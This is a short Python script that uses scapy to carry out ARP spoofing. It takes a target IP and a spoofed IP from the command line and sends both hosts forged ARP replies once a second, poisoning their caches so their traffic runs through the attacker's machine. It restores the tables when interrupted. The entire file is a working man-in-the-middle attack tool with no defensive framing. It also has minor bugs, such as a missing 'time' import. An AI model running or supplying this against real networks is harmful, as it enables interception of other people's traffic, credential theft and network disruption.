import scapy.all as scapy
import argparse

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', dest='target', help='Target IP.')
	parser.add_argument('-s', '--spoof', dest='spoof', help='IP to spoof.')
	arguments = parser.parse_args()
	if not arguments:
		print('Please enter a target/spoof IP.')
	return arguments

def get_mac(ip):
	arp_req = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.ARP(pdst=ip)
	answered_list = scapy.srp(arp_req, timeout=1, verbose=False)[0]
	if len(answered_list) is not 0:
		return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
	dest_mac = get_mac(dest_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)

args = get_arguments()

sent_packets = 0
try:
	while True:
		spoof(args.target, args.spoof)
		spoof(args.spoof, args.target)
		sent_packets += 2
		print('\r[+] Packets Sent: ' + str(sent_packets), end='')
		time.sleep(1)
except KeyboardInterrupt:
	print('\n[+] Detected Keyboard Interrupt ...... Quitting.')
	restore(args.target, args.spoof)
	restore(args.spoof, args.target)
